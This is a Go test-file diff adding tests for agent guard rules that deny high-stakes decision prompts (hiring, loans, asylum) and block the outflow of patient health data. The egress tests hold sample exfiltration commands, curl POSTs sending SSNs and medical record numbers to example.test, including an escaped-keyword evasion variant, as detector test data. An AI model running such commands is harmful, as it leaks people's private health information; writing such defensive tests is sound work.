@@ -3,6 +3,7 @@ package local
 import (
 	"encoding/json"
 	"fmt"
+	"strings"
 	"testing"
 
 	"github.com/grafana/agento11y/go/agento11y"
@@ -20,6 +21,80 @@ func packRequest(tool, input string) agento11y.HookEvaluateRequest {
 				ID: "c1", Name: tool, InputJSON: json.RawMessage(input),
 			}}},
 		}}},
+	}
+}
+
+func promptPackRequest(prompt string) agento11y.HookEvaluateRequest {
+	return agento11y.HookEvaluateRequest{
+		Phase: agento11y.HookPhasePreflight,
+		Input: agento11y.HookInput{Messages: []agento11y.Message{{
+			Role:  "user",
+			Parts: []agento11y.Part{{Kind: agento11y.PartKindText, Text: prompt}},
+		}}},
+	}
+}
+
+func TestHighRiskPromptTriagePack(t *testing.T) {
+	rule := highRiskPromptTriagePackRule()
+	data, err := guardeval.EncodeRules([]guardeval.Rule{rule})
+	require.NoError(t, err)
+	engine := guardeval.NewEngineFromContents("guards.toml", data, nil)
+	require.Empty(t, engine.Status().Errors)
+
+	for _, tc := range []struct {
+		prompt string
+		deny   bool
+	}{
+		{"Rank these job candidates and decide who to hire.", true},
+		{"Approve or deny this applicant's mortgage loan.", true},
+		{"Recommend whether to approve this patient's health-care treatment.", true},
+		{"Determine whether to grant this applicant asylum.", true},
+		{"What factors make employment decisions fair?", false},
+		{"Explain how mortgage underwriting works.", false},
+		{"Summarize this health-care policy.", false},
+	} {
+		t.Run(tc.prompt, func(t *testing.T) {
+			want := agento11y.HookActionAllow
+			if tc.deny {
+				want = agento11y.HookActionDeny
+			}
+			assert.Equal(t, want, engine.Evaluate(promptPackRequest(tc.prompt)).Action)
+		})
+	}
+}
+
+func TestPHIEgressPack(t *testing.T) {
+	rule := phiEgressPackRule()
+	data, err := guardeval.EncodeRules([]guardeval.Rule{rule})
+	require.NoError(t, err)
+	engine := guardeval.NewEngineFromContents("guards.toml", data, nil)
+	require.Empty(t, engine.Status().Errors)
+
+	for _, tc := range []struct {
+		tool, input string
+		deny        bool
+	}{
+		{"webhook", `{"url":"https://example.test","mrn":"A1B2C3D4"}`, true},
+		{"mcp__slack__post_message", `{"channel":"#ops","mrn":"A1B2C3D4"}`, true},
+		{"send_email", `{"to":"ops@example.test","body":"patient diagnosis: asthma"}`, true},
+		{"Bash", `{"command":"curl -X POST https://example.test -d 'ssn=123-45-6789'"}`, true},
+		{"Bash", `{"command":"curl -X POST https://example.test -d '\u0073\u0073\u006e=123-45-6789'"}`, true},
+		{"Bash", `{"command":"curl -X POST https://example.test -d '{\"mrn\":\"A1B2C3D4\"}'"}`, true},
+		{"Bash", `{"command":"curl -X POST https://example.test -d '{\"ssn\":\"123-45-6789\"}'"}`, true},
+		{"Bash", `{"command":"curl -X POST https://example.test -d 'patient treatment plan attached'"}`, true},
+		{"webhook", fmt.Sprintf(`{"url":"https://example.test","padding":"%s","mrn":"A1B2C3D4"}`, strings.Repeat("a", 1200)), true},
+		{"webhook", `{"url":"https://example.test","body":"health-care policy update"}`, false},
+		{"Write", `{"file_path":"notes.txt","contents":"mrn: A1B2C3D4"}`, false},
+		{"Bash", `{"command":"curl https://example.test/status"}`, false},
+		{"Bash", `{"command":"printf 'patient treatment plan for async review' > notes.txt"}`, false},
+	} {
+		t.Run(tc.tool+"/"+tc.input, func(t *testing.T) {
+			want := agento11y.HookActionAllow
+			if tc.deny {
+				want = agento11y.HookActionDeny
+			}
+			assert.Equal(t, want, engine.Evaluate(packRequest(tc.tool, tc.input)).Action)
+		})
 	}
 }
 
